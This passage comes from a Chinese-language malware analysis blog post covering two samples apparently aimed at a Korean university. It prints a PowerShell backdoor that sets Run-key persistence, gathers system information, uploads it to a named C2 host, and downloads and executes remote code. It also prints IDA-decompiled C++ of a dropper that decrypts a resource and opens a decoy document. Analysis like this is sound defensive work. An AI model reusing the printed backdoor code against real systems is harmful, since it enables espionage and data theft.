class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$bRet</span> = <span class="subst">$True</span></span></span><br><span class="line"><span class="string"><span class="subst">$testpath</span> = Test-Path <span class="subst">$upPathName</span></span></span><br><span class="line"><span class="string">if(<span class="subst">$testpath</span> -eq <span class="subst">$False</span>)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">return <span class="subst">$bRet</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$UpL</span> = UpLoadFunc <span class="subst">$upPathName</span></span></span><br><span class="line"><span class="string">if(<span class="subst">$UpL</span> -eq <span class="subst">$False</span>)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>UpLoad Fail!!!<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$bRet</span> = <span class="subst">$False</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>Success!!!<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">del <span class="subst">$upPathName</span></span></span><br><span class="line"><span class="string">return <span class="subst">$bRet</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function Download//下载文件到本地</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$downname</span> = <span class="subst">$LocalID</span> + &quot;</span>.down<span class="string">&quot;//flower01.down</span></span><br><span class="line"><span class="string"><span class="subst">$delphppath</span> = <span class="subst">$SERVER_ADDR</span> + &quot;</span>del.php<span class="string">&quot;//http://mybobo.mygamesonline.org/flower01/del.php</span></span><br><span class="line"><span class="string"><span class="subst">$downpsurl</span> = <span class="subst">$SERVER_ADDR</span> + <span class="subst">$downname</span>//http://mybobo.mygamesonline.org/flower01/flower01.down</span></span><br><span class="line"><span class="string"><span class="subst">$codestring</span> = (New-Object System.Net.WebClient).DownloadString(<span class="subst">$downpsurl</span>)</span></span><br><span class="line"><span class="string"><span class="subst">$comletter</span> = decode <span class="subst">$codestring</span>//对数据进行加密</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$decode</span> = <span class="subst">$executioncontext</span>.InvokeCommand.NewScriptBlock(<span class="subst">$comletter</span>)</span></span><br><span class="line"><span class="string"><span class="subst">$RunningJob</span> = Get-Job -State Running</span></span><br><span class="line"><span class="string">if(<span class="subst">$RunningJob</span>.count -lt 3)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$JobName</span> = <span class="subst">$RunningJob</span>.count + 1</span></span><br><span class="line"><span class="string">Start-Job -ScriptBlock <span class="subst">$decode</span> -Name <span class="subst">$JobName</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$JobName</span> = <span class="subst">$RunningJob</span>.count</span></span><br><span class="line"><span class="string">Stop-Job -Name <span class="subst">$RunningJob</span>.Name</span></span><br><span class="line"><span class="string">Remove-Job -Name <span class="subst">$RunningJob</span>.Name</span></span><br><span class="line"><span class="string">Start-Job -ScriptBlock <span class="subst">$decode</span> -Name <span class="subst">$JobName</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$down_Server_path</span> = <span class="subst">$delphppath</span> + &quot;</span>?filename=<span class="variable">$LocalID</span><span class="string">&quot;//http://mybobo.mygamesonline.org/flower01/del.php?filename=flower01.down访问链接</span></span><br><span class="line"><span class="string"><span class="subst">$response</span> = [System.Net.WebRequest]::Create(<span class="subst">$down_Server_path</span>).GetResponse()//响应</span></span><br><span class="line"><span class="string"><span class="subst">$response</span>.Close()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function Get_info(<span class="subst">$logpath</span>)//获取路径下的文件信息</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">Get-ChildItem ([Environment]::GetFolderPath(&quot;</span>Recent<span class="string">&quot;)) &gt;&gt; <span class="subst">$logpath</span></span></span><br><span class="line"><span class="string">dir <span class="subst">$env</span>:ProgramFiles &gt;&gt; <span class="subst">$logpath</span></span></span><br><span class="line"><span class="string">dir &quot;</span>C:\Program <span class="title function_ invoke__">Files</span> (x86)<span class="string">&quot; &gt;&gt; <span class="subst">$logpath</span></span></span><br><span class="line"><span class="string">systeminfo &gt;&gt; <span class="subst">$logpath</span></span></span><br><span class="line"><span class="string">tasklist &gt;&gt; <span class="subst">$logpath</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function main</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force</span></span><br><span class="line"><span class="string"><span class="subst">$FilePath</span> = <span class="subst">$env</span>:APPDATA + <span class="subst">$LOG_FILEPATH</span>//%APPDATA%/flower01/</span></span><br><span class="line"><span class="string">New-Item -Path <span class="subst">$FilePath</span> -Type directory -Force</span></span><br><span class="line"><span class="string"><span class="subst">$szLogPath</span> = <span class="subst">$FilePath</span> + <span class="subst">$LOG_FILENAME</span>//%APPDATA%/flower01//flower01.hwp预定义好的上传文件</span></span><br><span class="line"><span class="string"><span class="subst">$key</span> = Get-Item -Path <span class="subst">$RegKey</span>//注册表值</span></span><br><span class="line"><span class="string"><span class="subst">$exists</span> = <span class="subst">$key</span>.GetValueNames() -contains <span class="subst">$RegValueName</span>//注册表名</span></span><br><span class="line"><span class="string">if(<span class="subst">$exists</span> -eq <span class="subst">$False</span>)//是否存在注册表名为Alzipupdate</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$value1</span> = New-ItemProperty -Path <span class="subst">$RegKey</span> -Name <span class="subst">$RegValueName</span> -Value <span class="subst">$regValue</span>//如果不存在设置名为是否存在注册表名为Alzipupdate的值为HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line"><span class="string">Get_info <span class="subst">$szLogPath</span>//获取计算机的基本信息</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (<span class="subst">$true</span>)//每隔10s上传收集到的信息</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">FileUploading <span class="subst">$szLogPath</span></span></span><br><span class="line"><span class="string">Start-Sleep -Milliseconds 10000</span></span><br><span class="line"><span class="string">Download</span></span><br><span class="line"><span class="string">Start-Sleep -Milliseconds 10000</span></span><br><span class="line"><span class="string">Start-Sleep -Milliseconds <span class="subst">$TIME_VALUE</span></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>具体的细节实现分析观察我在代码中对应程序的分析注释。下面大体描述一下样本程序的恶意行为：</p><h3 id="样本行为"><a href="#样本行为" class="headerlink" title="样本行为"></a>样本行为</h3><p>1.样本首先查找本机注册表是否存在值为Alzipupdate的项，如果没有创建这个项的自启动。</p><p>2.样本获取被攻击者计算机主机的相关信息，包括ProgramFiles下文件信息、Program File (x86)下文件信息、Systeminfo信息、Tasklist，并将它们写入预定义好的文件%APPDATA%&#x2F;flower01&#x2F;&#x2F;flower01.hwp里</p><p>3.样本访问C2 <a href="http://mybobo.mygamesonline[.]org/flower01/post.php">http://mybobo.mygamesonline[.]org/flower01/post.php</a> 并将文件上传到C2地址，每10s执行一次。</p><h3 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h3><p><img src="https://s2.loli.net/2022/10/19/aYIVhW3PxzTfU7F.png" alt="image-20221018170218809.png"></p><h2 id="样本2"><a href="#样本2" class="headerlink" title="样本2"></a>样本2</h2><h3 id="样本基本信息-1"><a href="#样本基本信息-1" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p>此样本的基本信息：</p><p><img src="https://s2.loli.net/2022/10/19/r2ubwFaNhqeK41L.png" alt="image-20221017204140270.png"></p><p>提取样本的基本信息：</p><table><thead><tr><th align="left">type</th><th>hash</th></tr></thead><tbody><tr><td align="left">SHA256:</td><td>bfb8d13fcb64e3d09de2850b47d64492dbfc7bba58766546c1511f1fa59a64c9</td></tr><tr><td align="left">MD5:</td><td>adc39a303e9f77185758587875097bb6</td></tr><tr><td align="left">SHA1:</td><td>134d9e732a33413519341e4947013e7c7e521415</td></tr></tbody></table><h3 id="样本分析-1"><a href="#样本分析-1" class="headerlink" title="样本分析"></a>样本分析</h3><p>下面从逆向角度对样本进行分析。拿到样本发现是个win32位可执行程序（010editor的PE标志），拖入ida静态观察一下，程序载入就进入Winmain，Winmain函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HMODULE v4; <span class="comment">// eax</span></span><br><span class="line">  HMODULE v5; <span class="comment">// edi</span></span><br><span class="line">  HRSRC v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  HGLOBAL v8; <span class="comment">// eax</span></span><br><span class="line">  __m128i *v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  __m128i *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// edi</span></span><br><span class="line">  __m128i v18; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v23; <span class="comment">// edi</span></span><br><span class="line">  HANDLE v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v26; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">void</span> *v27; <span class="comment">// esi</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+8h] [ebp-120h] BYREF</span></span><br><span class="line">  __m128i *v29; <span class="comment">// [esp+Ch] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp+10h] [ebp-118h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp+14h] [ebp-114h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp+18h] [ebp-110h]</span></span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">260</span>]; <span class="comment">// [esp+20h] [ebp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_404140</span>() )                           <span class="comment">// 导入库、文件操作函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sub_4041D0</span>() )                         <span class="comment">// 导入网络操作函数</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;Advapi32.dll&quot;</span>);</span><br><span class="line">      v5 = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">GetProcAddress</span>(v4, <span class="string">&quot;RegOpenKeyExA&quot;</span>);    <span class="comment">// 导入注册表操作函数</span></span><br><span class="line">        <span class="built_in">GetProcAddress</span>(v5, <span class="string">&quot;RegQueryValueExA&quot;</span>);</span><br><span class="line">        <span class="built_in">GetProcAddress</span>(v5, <span class="string">&quot;RegSetValueExA&quot;</span>);</span><br><span class="line">        <span class="built_in">GetProcAddress</span>(v5, <span class="string">&quot;RegCloseKey&quot;</span>);</span><br><span class="line">        v6 = <span class="built_in">FindResourceA</span>(<span class="number">0</span>, <span class="number">104</span>, <span class="string">&quot;JUYFON&quot;</span>);   <span class="comment">// 找到资源段JUYFON</span></span><br><span class="line">        v7 = <span class="built_in">SizeofResource</span>(<span class="number">0</span>, v6);</span><br><span class="line">        v32 = v7;</span><br><span class="line">        v8 = <span class="built_in">LoadResource</span>(<span class="number">0</span>, v6);               <span class="comment">// 导入资源段</span></span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="built_in">LockResource</span>(v8);</span><br><span class="line">          v29 = v10;</span><br><span class="line">          v11 = <span class="built_in">unknown_libname_1</span>(v7);</span><br><span class="line">          v12 = <span class="number">0</span>;</span><br><span class="line">          lpBuffer = v11;</span><br><span class="line">          <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v7 &gt;= <span class="number">0x20</span> &amp;&amp; (v11 &gt; &amp;v10[<span class="number">-1</span>].m128i_i8[v7 + <span class="number">15</span>] || &amp;v11[v7 - <span class="number">1</span>] &lt; v10) )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = v7 - (v7 &amp; <span class="number">0x8000001F</span>);</span><br><span class="line">              v14 = v10;</span><br><span class="line">              v31 = v11 - v10;</span><br><span class="line">              v15 = (v11 + <span class="number">16</span>);</span><br><span class="line">              v16 = v11 - v10;</span><br><span class="line">              v30 = v15;</span><br><span class="line">              v7 = v32;</span><br><span class="line">              v17 = v30;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                v18 = *v14;</span><br><span class="line">                v14 += <span class="number">2</span>;</span><br><span class="line">                *(&amp;v14[<span class="number">-2</span>] + v16) = _mm_xor_si128(v18, xmmword_4193F0);</span><br><span class="line">                *(v17 + v12) = _mm_xor_si128(v14[<span class="number">-1</span>], xmmword_4193F0);</span><br><span class="line">                v12 += <span class="number">32</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v12 &lt; v13 );</span><br><span class="line">              v10 = v29;</span><br><span class="line">              v11 = lpBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v12 &lt; v7 )</span><br><span class="line">            &#123;</span><br><span class="line">              v19 = &amp;v11[v12];</span><br><span class="line">              v20 = v10 - v11;</span><br><span class="line">              v21 = v7 - v12;</span><br><span class="line">              <span class="keyword">do</span>                                <span class="comment">// 对resource段解密</span></span><br><span class="line">              &#123;</span><br><span class="line">                v22 = (v19++)[v20];</span><br><span class="line">                *(v19 - <span class="number">1</span>) = v22 ^ <span class="number">0x7F</span>;        <span class="comment">// 断点，生成shellcode</span></span><br><span class="line">                --v21;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v21 );</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(Buffer));</span><br><span class="line">          <span class="built_in">GetTempPathA</span>(<span class="number">0x104</span>u, Buffer);</span><br><span class="line">          v23 = &amp;lpBuffer + <span class="number">3</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *++v23 )</span><br><span class="line">            ;</span><br><span class="line">          <span class="built_in">qmemcpy</span>(v23, <span class="string">&quot;4.[酒怕楷备]稠巩捧绊痹沥.docx&quot;</span>, <span class="number">0xD3</span>u);<span class="comment">// 给创建的文件命名</span></span><br><span class="line">          <span class="built_in">DeleteFileA</span>(Buffer);</span><br><span class="line">          v25 = <span class="built_in">CreateFileA</span>(Buffer, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);<span class="comment">// 创建文件</span></span><br><span class="line">          v26 = lpBuffer;</span><br><span class="line">          v27 = v25;</span><br><span class="line">          NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">WriteFile</span>(v25, lpBuffer, v7, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">          <span class="built_in">CloseHandle</span>(v27);</span><br><span class="line">          <span class="built_in">j_j_j___free_base</span>(v26);</span><br><span class="line">          <span class="built_in">Sleep</span>(<span class="number">0xC8</span>u);</span><br><span class="line">          <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, Buffer, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>);<span class="comment">// 打开生成的.docx操作</span></span><br><span class="line">          <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// 创建线程，执行StartAddress函数的内容</span></span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">0x2710</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序开始在sub_404140()函数下导入了库、文件操作函数，在sub_4041D0()函数导入了网络函数，所以推测样本会对文件进行操作（例如读、写、创建文件等），也会对网络进行操作（例如访问某个网址，HTTP连接等）。后面导入注册表操作函数，然后是跟资源有关的函数，在这个地方程序导入了名称为”JUYFON”的资源表，使用PEView观察资源表的状况，存在这个资源表。后面多次嵌套if和do…while结构对资源端进行解密，解密出一个word类型程序在内存中</p><p><img src="https://s2.loli.net/2022/10/19/rJ8bMYz4eVU7CAu.png" alt="image-20221017154225399.png"></p><p>下面一段内容样本程序在本地Temp路径下创建一个word文档名称为“4.[酒怕楷备]稠巩捧绊痹沥.docx”。并且将内存内容写入文档里。</p><p><img src="https://s2.loli.net/2022/10/19/G1ZyczDnoXHWUvK.png" alt="image-20221017161702974.png"></p><p><img src="https://s2.loli.net/2022/10/19/hgHk3NldxXYSf8n.png" alt="image-20221017161912464.png"></p><p>打开生成的word文档发现是朝鲜文，翻译一下发现这是针对韩国庆熙大学国际研究院的攻击。</p><p><img src="https://s2.loli.net/2022/10/19/LQ3KWbCIzYtl5nF.png" alt="image-20221017162240671.png"></p><p>开始推测以为文档可能有宏病毒，使用工具查一下发现没有宏。</p><p><img src="https://s2.loli.net/2022/10/19/zAa7icy4drsxeqK.png" alt="image-20221017162354004.png"></p><p>最后程序使用CreateThread()函数创建了一个子线程，线程名称是StartAddress。线程的基本逻辑如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall __noreturn <span class="title">StartAddress</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CHAR pszPath[<span class="number">260</span>]; <span class="comment">// [esp+4h] [ebp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pszPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(pszPath));</span><br><span class="line">  <span class="built_in">SHGetSpecialFolderPathA</span>(<span class="number">0</span>, pszPath, <span class="number">26</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">lstrcatA</span>(pszPath, <span class="string">&quot;\\Microsoft\\HNC&quot;</span>);        <span class="comment">// 拼接路径</span></span><br><span class="line">  <span class="built_in">CreateDirectoryA</span>(pszPath, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">GetShortPathNameA_0</span>(pszPath, pszPath, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">wsprintfA</span>(FileName, <span class="string">&quot;%s\\%s&quot;</span>, pszPath, <span class="string">&quot;wcl.docx&quot;</span>);</span><br><span class="line">  <span class="built_in">wsprintfA</span>(byte_41DBB8, <span class="string">&quot;%s\\%s&quot;</span>, pszPath, <span class="string">&quot;tcf.bin&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_404250</span>();                                 <span class="comment">// Windows下命令行获取系统信息并写入wcl.docx文件中</span></span><br><span class="line">  <span class="built_in">Sleep</span>(<span class="number">10000u</span>);</span><br><span class="line">  <span class="built_in">sub_4049E0</span>();                                 <span class="comment">// 构造网络请求</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_4045C0</span>();</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x1B7740</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子线程拼接了一个本地路径”C:\Users\Anonymous\AppData\Roaming\Microsoft\HNC”，同时试图创建两个文件”wcl.docx”和”tcf.bin”</p><p><img src="https://s2.loli.net/2022/10/19/BU8lKotRZq7pyfF.png" alt="image-20221017165149195.png"></p><p>后面的三个函数sub_404250()、sub_4049E0()、sub_4045C0()都比较关键，下面逐一进行分析：</p><h4 id="sub-404250"><a href="#sub-404250" class="headerlink" title="sub_404250()"></a>sub_404250()</h4><p>其代码逻辑如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_404250</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SHELLEXECUTEINFOA pExecInfo; <span class="comment">// [esp+0h] [ebp-658h] BYREF</span></span><br><span class="line">  CHAR v1[<span class="number">260</span>]; <span class="comment">// [esp+3Ch] [ebp-61Ch] BYREF</span></span><br><span class="line">  CHAR szLongPath[<span class="number">260</span>]; <span class="comment">// [esp+140h] [ebp-518h] BYREF</span></span><br><span class="line">  CHAR pszPath[<span class="number">260</span>]; <span class="comment">// [esp+244h] [ebp-414h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">260</span>]; <span class="comment">// [esp+348h] [ebp-310h] BYREF</span></span><br><span class="line">  CHAR szShortPath[<span class="number">260</span>]; <span class="comment">// [esp+44Ch] [ebp-20Ch] BYREF</span></span><br><span class="line">  CHAR v6[<span class="number">260</span>]; <span class="comment">// [esp+550h] [ebp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(szShortPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(szShortPath));</span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(Buffer));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="built_in">sizeof</span>(v6));</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">GetEnvironmentVariableA</span>(<span class="string">&quot;COMSPEC&quot;</span>, Buffer, <span class="number">0x103</span>u) )<span class="comment">// cmd.exe文件路径：C:\\Windows\\system32\\cmd.exe</span></span><br><span class="line">  &#123;</span><br><span class="line">    pExecInfo.lpVerb = <span class="string">&quot;Open&quot;</span>;</span><br><span class="line">    pExecInfo.lpFile = Buffer;                  <span class="comment">// cmd文件路径</span></span><br><span class="line">    pExecInfo.cbSize = <span class="number">60</span>;                      <span class="comment">// 长度</span></span><br><span class="line">    pExecInfo.hwnd = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.lpDirectory = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.fMask = <span class="number">64</span>;</span><br><span class="line">    pExecInfo.nShow = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(pszPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(pszPath));</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">SHGetSpecialFolderPathA</span>(<span class="number">0</span>, pszPath, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">GetShortPathNameA</span>(pszPath, szShortPath, <span class="number">0x104</span>u);</span><br><span class="line">      <span class="built_in">wsprintfA</span>(v6, <span class="string">&quot;/c dir %s\\ &gt;&gt; %s&quot;</span>, szShortPath, FileName);</span><br><span class="line">      pExecInfo.lpParameters = v6;</span><br><span class="line">      <span class="built_in">ShellExecuteExA</span>(&amp;pExecInfo);              <span class="comment">// 执行/c dir C:\Users\ANONYM~1\Desktop\ &gt;&gt; C:\Users\ANONYM~1\AppData\Roaming\MICROS~1\HNC\wcl.docx  生成docx文件</span></span><br><span class="line">      <span class="built_in">Sleep</span>(<span class="number">3000u</span>);</span><br><span class="line">      <span class="built_in">memset</span>(szLongPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(szLongPath));</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">SHGetSpecialFolderPathA</span>(<span class="number">0</span>, szLongPath, <span class="number">8</span>, <span 